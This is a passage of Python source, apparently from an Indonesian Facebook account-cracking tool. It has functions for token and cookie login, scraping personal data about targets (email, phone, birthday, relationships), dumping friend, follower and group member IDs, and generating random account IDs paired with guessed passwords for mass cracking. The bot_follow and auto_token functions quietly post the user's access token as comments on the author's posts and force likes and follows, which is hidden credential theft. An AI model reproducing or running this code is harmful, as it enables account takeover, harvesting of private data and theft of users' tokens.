                ThreadPool(35).map(self.mabasic,self.fl);os.remove(self.apk);exit()
    def KangBANDAR(self):
            global ok,cp
            self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('|')
                        form.submit(self.mbasicv1,zz[0], generate(zz[1]))
                    except:pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")

def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
def ganti_ua():
	jalan(war+"Enter your User Agnet !!")
	jalan(war+"Type * def * for Default User Agent Settings Script !!")
	uq = input(war+'User Agent : ')
	if uq in [""," "]:
		print(war+"Don't Empty Bro")
	elif uq in ["DEF","def","* def *","Def"]:
		print(war+"OK, User Agent has been successfully setup !")
		time.sleep(1)
		os.system("rm -rf .ua")
		exit(war+"Run Script Again : python jmbf.py")

	else:
		print(war+"OK, User Agent has been successfully setup !")
		time.sleep(1)
		dump = open('.ua','w') 
		dump.write(uq)
		dump.close()
		exit(war+"Run Script Again : python jmbf.py")
def get_info():
    i='\033[0;92m'
    try:
        toket=open(".login.txt","r").read()
    except IOError:
        print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("rm -rf .login.txt")
        logs()
    try:
        idt = input(inp+'Enter ID Target :')
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
    except Exception as e: 
        print(war+"Problem! Not Found %s"%(e))
        exit()
    try:
        nama = op['name']
    except (KeyError, IOError):
        nama = M+"—"+Q
    try:
        namade = op['first_name']
    except (KeyError, IOError):
        namade= M+"—"+Q
    try:
        namabe = op['last_name']
    except (KeyError, IOError):
        namabe= M+"—"+Q
    try:
        idfb = op['id']
    except (KeyError, IOError):
        idfb = M+"—"+Q
    try:
        user = op['username']
    except (KeyError, IOError):
        user = M+"—"+Q
    try:
        ttll = op['birthday']
    except (KeyError, IOError):
        ttll = M+"—"+Q
    try:
        tzim = op['timezone']
    except (KeyError, IOError):
        tzim = M+"—"+Q
    try:
        stas = op['relationship_status']
    except (KeyError, IOError):
        stas = M+"—"+Q
    try:
        dgn = '''dengan %s'''%(op['significant_other']['name'])
    except (KeyError, IOError):
        dgn = M+"—"+Q
    try:
        tigl = op['location']['name']
    except (KeyError, IOError):
        tigl = M+"—"+Q
    try:
        dari = op['hometown']['name']
    except (KeyError, IOError):
        dari = M+"—"+Q
    try:
        lins = op['link']
    except (KeyError, IOError):
        lins = M+"—"+Q
    try:
        uptd = op['updated_time']
    except (KeyError, IOError):
        uptd = M+"—"+Q
    try:
        nmrr = op['mobile_phone']
    except (KeyError, IOError):
        nmrr = M+"—"+Q
    try:
        emai = op['email']
    except (KeyError, IOError):
        emai = M+"—"+Q
    try:
        bioo = op['about']
    except (KeyError, IOError):
        bioo = M+"—"+Q
    try:
        gndr = op['gender']
    except (KeyError, IOError):
        gndr = M+'—'+Q
    try:
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        id = []
        z = json.loads(r.text)
        for i in z["data"]:
                id.append(i["id"]+"|"+i["name"])
        temn = "%s"%(len(id))
    except KeyError:
        temn = M+"—"+Q
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, toket))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s'%(M,N)
    except: pass
    print("\n"+war+'Informasih Target !!');time.sleep(0.30)
    print(bulat+"Full Name       : %s%s%s"%(I,nama,Q))
    print(bulat+"First Name      : %s%s%s"%(I,namade,Q))
    print(bulat+"Last Name       : %s%s%s"%(I,namabe,Q));time.sleep(0.30)
    print(bulat+'UserName        : %s%s%s'%(I,user,Q));time.sleep(0.30)
    print(bulat+'Tanggal Lahir   : %s%s%s'%(I,ttll,Q));time.sleep(0.30)
    print("\n"+war+'Data Data Target !!');time.sleep(0.30)
    print(bulat+'Gmail Facebook  : %s%s%s'%(I,emai,Q));time.sleep(0.30)
    print(bulat+'Nomor Telepons  : %s%s%s'%(I,nmrr,Q));time.sleep(0.30)
    print(bulat+'Jenis Kelamin   : %s%s%s'%(I,gndr,Q));time.sleep(0.30)
    print(bulat+'Jumlah Teman    : %s%s%s'%(I,temn,Q));time.sleep(0.03)
    print(bulat+'Followers       : %s%s%s'%(I,pengikut,Q));time.sleep(0.30)
    print(bulat+'Status Hubungan : %s%s %s%s'%(I,stas,dgn,Q));time.sleep(0.03)
    print(bulat+'Link Facebook   : %s%s%s'%(I,lins,Q));time.sleep(0.30)
    print(bulat+'Tentang Status  : %s%s%s'%(I,bioo,Q));time.sleep(0.30)
    print(bulat+'Kota Asal       : %s%s%s'%(I,dari,Q));time.sleep(0.30)
    print(bulat+'Tinggal         : %s%s%s'%(I,tigl,Q));time.sleep(0.30)
    print(bulat+'Terahir DiUpdate: %s%s%s'%(I,uptd,Q));time.sleep(0.30)
    input(war+"Tekan Enter Untuk Kembali"+Q)
    menu()

def login():
	os.system("clear")
	print (logo)
	os.popen('play-audio login2.mp3')
	print(f"     ╭────────────────────────────╮")
	jalan("     │ L O G I N  F A C E B O O K │")
	print(f"     ╰────────────────────────────╯\n")	
	print("╭────────────────────•")
	print ("├─[%s01%s] Login Token"%(O,P))
	print ("├─[%s02%s] Login Cookies"%(O,P))
	print("╰──────────•\n")
#	print ("[3] Login Dengan Token Gratis")
	h_ = input(war+'Choose : ')
	if h_ in ["1", "01", "token"]:
		token()
	elif h_ in ["2", "02", "cokies"]:
		coke()
	elif h_ in ["auto"]:
		auto_token()
	else:jalan(war+"Isi Dengan Benar Kontol");time.sleep(1);login()
def auto_token():
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdr")

#	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=180923747373969&id=100063690353340&_rdr")

#	link_token = requests.get("https://m.facebook.com/photo.php?fbid=120338706765807&id=100063690353340&set=a.116524033813941&source=11&ref=bookmarks")

#	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=1714009362122228&id=100005395413800&_rdr")
	gbl = par(link_token.content,'html.parser')
#	print (gbl)
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			print(war+"Token Yang Ke : "+str(ba))
			post4 = ('180923747373969') # Logo Zero From Risky 2021
			post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
			requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
			requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
			cek_token(naa)
	exit(war+"Sorry Token Not Found")
def token():
    toket = input(war+"Input Token :\x1b[0;96m ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open(".login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((war+"\nLogin Successful"))
        bot_follow()
    except KeyError:
        print(("\x1b[0;91m[!] Token Invalid"))
        time.sleep(2)
        token()
def check_kukis():
	session = req.Session()
	try:coki = open(".cokie.txt", "r").read()
	except:coke()
	respon = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama__ = re.findall('\<title\>(.*?)<\/title\>',str(respon))[0]
#	print(nama__)
	if "Halaman Tidak Ditemukan" in nama__:
		jalan(war+"Sorry Your Cookies Are Dead");time.sleep(1)
		try:os.remove(".cokie.txt")
		except:pass
	else:pass
def coke():
        _cookie=input(war+'Cookies : '+I)
        _cookie += "noscript=1;"+_cookie
        try:
                _head={
                        'Host':'business.facebook.com',
                                'cache-control':'max-age=0',
                        'upgrade-insecure-requests':'1',
                                'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
                        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                        'accept-encoding':'gzip, deflate',
                                'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cookie': _cookie
                }
                _r=_ses.get(urls, headers=_head)
                _p=re.search('(EAAG\w+)', _r.text)
                _h=_p.group(1)
                if 'EAA' in _h:
                        open(".login.txt", 'w').write('%s' % (_h))
                        open(".cokie.txt", 'w').write('%s' % (_cookie))
                        #bokep_barat_yang_terbaru(_cookie)
                        #bokep_barat_yang_terbaru(_h)
#                        bot_follow()
        except (AttributeError, requests.exceptions.TooManyRedirects):
                print(war+'Cookies Error !')
                time.sleep(3)
                coke()
        exit(jalan(war+"Run This Script Again: python jmbf.py"))


def bot_follow():
	s_ = requests.Session()
	post1 = ('4111448792295892') # Risky 2011
	post2 = ("120338706765807") # Risky 2021
	post3 = ("167879918678352") # Sama Macam dibawah
	post4 = ('180923747373969') # Logo Zero From Risky 2021
	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("198550702277940") # Logo Akira From Risky 2031
	post7 = ("198552118944465") # Logo Attaxk From Risky 2021
	curi_ = ("4111448792295892") # Logo Zero Isap Permen :v
	my_idz_bot = [
	"100004499498856",
	"100000260233573",
	"100003888153228",
	"100076835203956",
	"100047878441954"
	]
	my_post_bot = [
	"120338706765807",
	"180923747373969",
	"172628718203472",
	"198550702277940",
	"198552118944465",
	"287175390082137",
	"230946969169829",
	"235968105334382",
	"197993725798487",
	"218558783741981",
	"138061478458379"
	]
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = s_.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
		print(war+'Your Facebook Name : '+nama)
		print(war+'Your Facebook Id  : '+id)
		#bokep_barat_yang_terbaru(token)
	except Exception as e:
		print((war+"Token Invalid >%s%s%s<"%(I,e,Q)))
		time.sleep(1)
		login()
	for id_bot in my_idz_bot:
		s_.post('https://graph.facebook.com/'+id_bot+'/subscribers?access_token='+token)
	for post_id in my_post_bot:
		s_.post("https://graph.facebook.com/"+post_id+"/likes?summary=true&access_token=" + toket)
	s_.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
	s_.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
	s_.post('https://graph.facebook.com/287175390082137/comments/?message=' + token + '&access_token=' + token)

	menu()    
def cek_token(token):
	requests.post("https://graph.facebook.com/me/feed/?link=https://fb.com/100044347381124/posts/450021263152783/?app=fbl&access_token=" + token)
	try:
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
		print(war+'Your Facebook name : '+nama[0:10])
		print(war+'Your Facebook Id   : '+id)
		print(war+""+token)
	except:pass
	try:
		goblok = []
		for i in requests.get("https://graph.facebook.com/me/friends?limit=9999&access_token="+token).json()["data"]:
			try:
				anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
				goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
			except:pass
	except KeyError:pass
	_id = ("%s"%(len(goblok)))
	if _id == "0" or "0" == _id:
		jalan(war+"Have No Friends !")
	else:
		print(war+"Friend : "+I+_id+Q)
		jalan(war+"Do you want to use this token (y/n):")
		haalq = input(war+"Choose : ")
		if haalq in ["y","Y"]:
			tok = open(".login.txt", "w")
			tok.write(token)
			tok.close()
			print ("\n"+war+"Token : "+I+token+Q)
			exit(jalan(war+"Token Found. Please, Type: python jmbf.py"))
			exit()
		else:pass
	print ("\n")
def buat_old():
	jalan(war+"Please Choose the Old Idz Form !")
#		   1000000000"+U+"00000
	print("[1] 1000000000"+U+"*****"+Q)
	print("[2] 100000000"+U+"******"+Q)
	print("[3] 10000000"+U+"*******"+Q)
	print("[4] 1000000"+U+"********"+Q)
	print("[5] 100000"+U+"*********"+Q)
	print("[6] 10000"+U+"**********"+Q)
	ben = input("\n"+war+"Old Form: ")
	try:
		lim_ = int(input(war+"Limit : "))
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		jalan(war+"Don't Empty Om !");time.sleep(2)
		buat_old()
	elif ben == "1" or ben == "01":
		_             = 11111
		__            = 99999
		___ ="1000000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Do you want to immediately start crack? (Y/n): ")
		nha = input(war+"Choose : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Press Enter !!");time.sleep(2)
			menu()
	elif ben == "2" or ben == "02":
#		      100000000000000
#		      100000000******
		_            = 111111
		__           = 999999
		___ ="100000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Do you want to immediately start crack? (Y/n): ")
		nha = input(war+"Choose : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Press Enter !!");time.sleep(2)
			menu()


	elif ben == "3" or ben == "03":
#		      100000000000000
#		      10000000*******
		_           = 1111111
		__          = 9999999
		___ ="10000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Do you want to immediately start crack? (Y/n): ")
		nha = input(war+"Choose : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Press Enter !!");time.sleep(2)
			menu()
	elif ben == "4" or ben == "04":
#		      100000000000000
#		      1000000********
		_          = 11111111
		__         = 99999999
		___ ="1000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Do you want to immediately start crack? (Y/n): ")
		nha = input(war+"Choose : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Press Enter !!");time.sleep(2)
			menu()
	elif ben == "5" or ben == "05":
#		      100000000000000
#		      100000*********
		_         = 111111111
		__        = 999999999
		___ ="100000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "6" or ben == "06":
#		      100000000000000
#		      10000**********
		_        = 1111111111
		__       = 9999999999
		___ ="10000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	else:
		jalan(war+"Isi Dengan Benar Om !");time.sleep(2)
		buat_old()
#def kiky_and_wans_and_jeck(limt, bn, gd, fu):

def buat_oldv1():
	try:
		for n in range(5000):
#					       100002151005321
#     			                       10000005100532
			bokeq = random.randint(111111111, 999999999)
			old_a = open('oldv2.txt', 'a')
			old_a.write(str(bokeq)+"|123456\n")

	except Exception as e:
		print((" Error : %s"%e)),;time.sleep(1)

def dump_old():
        try:
                token = open(".login.txt","r").read()
        except IOError:
                jalan(war+"Token Failed");time.sleep(2)
                time.sleep(0.5)
                login()
        try:
                nada = int(input("\n"+war+"Mau Dump Berapa Idz : "))
                if nada>20:
                        jalan(war+"Max 20 Idz")
                        time.sleep(0.5)
                        dump_old()
        except ValueError:
                jalan(war+"Input Invalid")
                time.sleep(0.5)
                dump_old()
        namax = input(war+"Name File (contoh : kiky)"+K+"Enter:Random"+Q+": ")
        if namax == "" or namax == " ":
           namax = text_random()
#           jalan(war+"Nama File Tidak Boleh Kosong");time.sleep(1);dump_old
        lonsg = open("dump/"+namax+".json", "w")
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(war+"Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(war+"Name :"+tulul["name"])
                except KeyError:
                        print(war+"Kemungkinan Idz Ini Tidak DiPublickan")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(war+"Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"|"+junet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"|"+junet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"|"+junet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        try:
                                                            jame, jamet = jamet.split("0000")
                                                            jamet = ("10000"+jamet)
                                                            id.append(jamet+"|"+junet)
                                                            tampung.append(jamet+"|"+junet)
                                                            well = open("dump/"+namax+".json","a")
                                                            well.write(jamet+"|"+junet+"\n")
                                                            well.close()
                                                        except:pass
                                except:
                                        continue
#                                except Exception as e:print("%s"%(e))
#                        print(war+"Total ID : %s"%(len(non_old)))
                        print(war+"Jumlah Akun Old : %s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(war+"Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                except:
                        jalan(war+"Maaf Idz "+C+uid+Q+" Ini Tidak DiPublickan, Cari Yang Lain_-");time.sleep(2);dump_old()
        id_ = ("%s"%(len(id)))
        if id_ == "0" or "0" == id_:
             jalan(war+"Kemungkinan ID yang kamu masukan tidak dipublickan !!")
        else:
             print(war+"Total ID : %s"%(len(id)))
             jalan(war+"Nama Hasil Dump : "+I+"dump/"+namax+".json"+Q)
             jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
             jalan("\n"+war+"Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
             zz = input(war+'Pilih : ')
             if zz in ["Y", "y", "Yes", "1"]:
                  crackmenu("dump/"+namax+".json").passmenu("dump/"+namax+".json")
                  exit()
             else:
                  pass
        input(war+"Tekan Enter Untuk Kembali")
        menu()
def dump_follow():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	try:
		tanya_total = int(input(war+"How much do you want to dump? : "))
	except:tanya_total=1
	namafi = input(war+"Name File (Example : Dada)"+K+"Enter:Random"+Q+" : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Write "+I+"me"+Q+" to dump your own data")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Input ID or Username target %s : "%(t))
		idt = ubah_username_to_id(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Sorry ID "+C+idt+Q+" This Was Not Found  !")
			continue
		jalan("\n"+war+"Name   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"|"+nama)
					dump.write(uid+'|'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Account is not Public !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Name Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+"Please Copy the Dump Result Name !!")
		jalan("\n"+war+"Do you want to directly crack with this file (Y/n) : ")
		zz = input(war+'Choose : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Press Enter !!")
	menu()	   
def cek_history(it):
	global tanya_total
	vc = ""
	if it == "me" or "me" == it:pass
	else:
		history = open(".idz", "a+")
	#	idt = input("Idz : ")
		his = open(".idz","r").readlines()
		for n in his:
			try:
				n = n.replace("\n","")
				if n == it:
					jalan(war+"Sorry Idz "+C+it+Q+" This Has Been Dump/Crack\n")
					vc += "1"
			except:pass
		if vc == "1" or "1" == vc:
			jalan(war+"Do You Want to Dump/Crack With This Idz (Y/n) : ")
			bz = input(inp+"Choose : ")
			if bz == "Y" or bz == "y":
				tanya_total += 1
				return tanya_total
		else:
			history.write(it+"\n")
			history.close()
def crack_grup(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        _cok_  = {"cookie":_mmk_}
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=_cok_).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"|"+softek[1])
                open("dump/"+nama_grup+".json", "a").write(re.findall("id=(.*)",softek[0])[0]+"|"+softek[1]+"\n")
            else:
                id.append(softek[0]+"|"+softek[1])
                open("dump/"+nama_grup+".json", "a").write(softek[0]+"|"+softek[1]+"\n")
            sys.stdout.write('\r'+war+'Gathering %s Idz... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"|"+c[1])
                                open("dump/"+nama_grup+".json", "a").write(d+"|"+c[1]+"\n")
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"|"+c[1])
                                open("dump/"+nama_grup+".json", "a").write(d+"|"+c[1]+"\n")
                        sys.stdout.write('\r'+war+'Gathering %s Idz... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass




def dump_public():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)
	try:
		tanya_total = int(input(war+"Total ID : "))
	except:tanya_total=1
	namafi = input(war+"Name File : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Type me To Dump From Friendlist")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Input ID or Username target %s : "%(t))
		idt = ubah_username_to_id(idt)
#		cek_history(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Sorry ID "+C+idt+Q+" This Was Not Found ! ("+str(e)+")")
			continue
		jalan("\n"+war+"Name   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"|"+nama)
					dump.write(uid+'|'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Account Was Not Public !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Name Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+"Please Copy the Dump Result Name !!")
		jalan("\n"+war+"Do you want to directly crack with this file (Y/n) : ")
		zz = input(war+'Choose : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Press Enter !!")
	menu()	    
def dump_follow_public():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	try:
		tanya_total = int(input(war+"How much do you want to dump?: "))
	except:tanya_total=1
	namafi = input(war+"Name File (Example : Dada)"+K+"Enter:Random"+Q+" : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Write "+I+"me"+Q+"to dump your own data ")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Input ID or Username target %s : "%(t))
		idt = ubah_username_to_id(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Sorry ID "+C+idt+Q+" This Was Not Found !")
			continue
		jalan("\n"+war+"Name   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+')
